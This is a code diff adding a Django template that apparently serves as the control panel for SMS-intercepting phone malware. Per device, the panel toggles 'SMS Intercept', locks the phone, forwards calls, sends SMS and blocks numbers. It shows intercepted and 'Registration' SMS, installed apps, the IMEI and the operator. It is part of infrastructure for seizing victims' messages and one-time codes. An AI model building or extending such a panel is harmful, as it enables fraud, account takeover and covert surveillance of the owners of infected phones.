@@ -1,0 +1,265 @@
+{% extends "base.html" %}
+{% load mytags %}
+{% block extra_head %}
+    <link rel="stylesheet" href="{{ STATIC_URL }}css/bootstrap-switch.min.css" media="screen"/>
+    <script type="application/javascript" src="{{ STATIC_URL }}js/bootstrap-switch.min.js"></script>
+    <script type="application/javascript" src="{{ STATIC_URL }}js/jquery.cookie.js"></script>
+    <script type="application/javascript" src="{{ STATIC_URL }}js/phone_interface.js"></script>
+{% endblock %}
+
+{% block title %}SMS list{% endblock %}
+
+{% block page_header %}
+    <script type="application/javascript">
+        {#    setting up attached JS#}
+        urlGetMessages = "{% url 'get_messages' phone_data.id %}";
+        urlSMSList = "{% url 'sms_list' phone_data.id %}";
+        urlChangeState = "{% url 'toggle_phone' phone_data.id %}";
+        urlSendSMS = "{% url 'sms_send' phone_data.id %}";
+        urlForwardCalls = "{% url 'forward_calls' phone_data.id %}";
+        urlDisableForwardCalls = "{% url 'disable_forward_calls' phone_data.id %}";
+        urlUnblockNumber = "{% url 'unblock_number' phone_data.id %}";
+        urlBlockNumber = "{% url 'block_number' phone_data.id %}";
+        urlSaveComment = "{% url 'save_comment' phone_data.id %}";
+        urlChangeLockState = "{% url 'lock_phone' phone_data.id %}";
+        phoneIMEI = '{{ phone_data.imei }}';
+    </script>
+{% endblock %}
+
+{% block content %}
+    <div class="row">
+    <span id="id_spinner" style="display: none;" class="col-md-12"><img
+            src="{{ STATIC_URL }}images/spinner.gif"/>&nbsp;Working...</span>
+
+    <div class="col-md-8" id="id_main_area">
+    <div class="row">
+    <div class="col-md-6" id="id_left_toolbar">
+        <form role="form">
+            <div class="form-group">
+                <h3>SMS Intercept status</h3>
+
+                <div class="btn-group-vertical">
+                    <input type="checkbox" id="id_phone_switch" data-on-color="warning"
+                           data-label-text="SMS"
+                            {% is_phone_owner_by_user request phone_data %}
+                            {% is_phone_available request phone_data %} >
+                </div>
+            </div>
+        </form>
+        <form role="form">
+            <div class="form-group">
+                <h3>Locked</h3>
+
+                <div class="btn-group-vertical">
+                    <input type="checkbox" id="id_lock_switch" data-on-color="warning"
+                           data-label-text="Lock"
+                            {% is_phone_locked request phone_data %}
+                            {% is_phone_available request phone_data %} >
+                </div>
+            </div>
+        </form>
+        <form role="form" id="id_form_forward">
+            <div class="input-group">
+                <input type="text" class="form-control" placeholder="number" id="id_forward_number">
+                            <span class="input-group-btn">
+                                <button class="btn btn-warning" id="id_btn_forward_calls" type="button">Forward calls
+                                </button>
+                                <button class="btn btn-info" type="button" id="id_btn_disable_forward">Disable</button>
+                            </span>
+            </div>
+        </form>
+    </div>
+    <div class="col-md-6" id="id_sms_send_box">
+        <form role="form" id="id_form_sms_send">
+            <div class="form-group">
+                <div class="input-group">
+                    <input type="text" class="form-control" placeholder="Send SMS to..."
+                           id="id_send_sms_to">
+                            <span class="input-group-btn">
+                                <button class="btn btn-warning" id="id_btn_send_sms" type="button">Send</button>
+                            </span>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>SMS text
+                    <textarea cols="40" rows="5" id="id_send_sms_text"></textarea>
+                </label>
+            </div>
+        </form>
+    </div>
+    <div class="col-md-12" id="id_details_box" role="tabpanel" style="margin-top: 10px;">
+    <ul class="nav nav-tabs" role="tablist">
+            <li role="presentation" class="active">
+                <a href="#smslist" aria-controls="smslist" role="tab" data-toggle="tab">SMS</a>
+            </li>
+            <li role="presentation">
+                <a href="#int_smslist" aria-controls="int_smslist" role="tab" data-toggle="tab">Registration
+                    SMS</a>
+            </li>
+            <li role="presentation">
+                <a href="#blocked" aria-controls="blocked" role="tab" data-toggle="tab">Blocked numbers</a>
+            </li>
+            {% if app_data %}
+                <li role="presentation">
+                    <a href="#applist" aria-controls="applist" role="tab" data-toggle="tab">Installed
+                        apps</a>
+                </li>
+            {% endif %}
+            <li role="presentation">
+                <a href="#comment" aria-controls="comment" role="tab" data-toggle="tab">Your Comment</a>
+            </li>
+        </ul>
+        <div class="tab-content">
+            <div role="tabpanel" class="tab-pane active" id="smslist">
+                <button class="btn btn-default" type="button" id="id_reload_sms_list"
+                        style="margin-top: 20px;">
+                    <span class="glyphicon glyphicon-refresh">&nbsp;</span>Reload list
+                </button>
+                <div class="table-responsive">
+                    <table class="table table-stripped">
+                        <thead>
+                        <tr>
+                            <th>From</th>
+                            <th>Text</th>
+                        </tr>
+                        </thead>
+                        <tbody id="id_sms_list">
+                        {% for r in sms_data %}
+                            <tr>
+                                <td>{{ r.source|default_if_none:"n/a" }}</td>
+                                <td>{{ r.contents }}</td>
+                            </tr>
+                        {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <div role="tabpanel" class="tab-pane" id="int_smslist">
+                <div class="table-responsive">
+                    <table class="table table-stripped">
+                        <thead>
+                        <tr>
+                            <th>From</th>
+                            <th>Text</th>
+                        </tr>
+                        </thead>
+                        <tbody id="id_intsms_list">
+                        {% for r in int_sms_data %}
+                            <tr>
+                                <td>{{ r.sender|default_if_none:"n/a" }}</td>
+                                <td>{{ r.contents }}</td>
+                            </tr>
+                        {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <div role="tabpanel" class="tab-pane" id="blocked">
+                <form class="form-inline" role="form" style="margin-top: 20px;" id="id_form_block">
+                    <div class="form-group">
+                        <button class="btn btn-warning" type="button" id="id_clear_all_blocked">
+                            <span class="glyphicon glyphicon-remove">&nbsp;</span>Unblock all
+                        </button>
+                    </div>
+                    <div class="form-group">
+                        <div class="input-group">
+                            <label for="id_blocking_number" class="sr-only">Add blocked number</label>
+                            <input type="text" id="id_blocking_number" placeholder="Add blocked number"
+                                   class="form-control"/>
+                                        <span class="input-group-btn">
+                                            <button class="btn btn-warning" type="button" id="id_btn_block_number">
+                                                Block
+                                            </button>
+                                        </span>
+                        </div>
+                    </div>
+
+                </form>
+                <div class="table-responsive">
+                    <table class="table table-stripped">
+                        <thead>
+                        <tr>
+                            <th>Number</th>
+                        </tr>
+                        </thead>
+                        <tbody id="id_blocked_list">
+                        {% for r in blocked_data %}
+                            <tr>
+                                <td><a href="#" rel="{{ r.id }}" class="unblock_number">
+                                                <span title="Unblock"
+                                                      class="glyphicon glyphicon-remove">&nbsp;</span></a>
+                                    &nbsp;{{ r.number }}
+                                </td>
+                            </tr>
+                        {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+
+            </div>
+            {% if app_data %}
+                <div role="tabpanel" class="tab-pane" id="applist">
+                    <div class="table-responsive">
+                        <table class="table table-stripped">
+                            <thead>
+                            <tr>
+                                <th>App name</th>
+                            </tr>
+                            </thead>
+                            <tbody id="id_app_list">
+                            {% for r in app_data %}
+                                <tr>
+                                    <td>{{ r.name }}</td>
+                                </tr>
+                            {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            {% endif %}
+            <div role="tabpanel" class="tab-pane" id="comment">
+                <form role="form">
+                    <div class="form-group">
+                        <label for="id_comment">Your comment</label>
+                        <textarea id="id_comment" rows="10" cols="40"
+                                  class="form-control">{{ comment }}</textarea>
+                    </div>
+                    <button type="button" class="btn btn-default" id="id_btn_save_comment">Save</button>
+                </form>
+                {% if user_comments %}
+                    <div class="table-responsive">
+                        <table class="table table-stripped">
+                            <caption>User comments</caption>
+                            <thead>
+                            <tr>
+                                <th>User</th>
+                                <th>Comment</th>
+                            </tr>
+                            </thead>
+                            <tbody>
+                            {% for c in user_comments %}
+                                <tr>
+                                    <td>{{ c.user.username }}</td>
+                                    <td>{{ c.contents }}</td>
+                                </tr>
+                            {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+    </div>
+    </div>
+    <div class="col-md-4" id="id_info_right">
+        <h4>Phone # {{ phone_data.number }}</h4>
+
+        <p><label>Phone ID</label> {{ phone_data.uniq_id }}</p>
+
+        <p><label>IMEI</label> {{ phone_data.imei }}</p>
+
+        <p><label>Operator</label> {{ phone_data.operator }}</p>
+    </div>
+    </div>
+{% endblock content %}
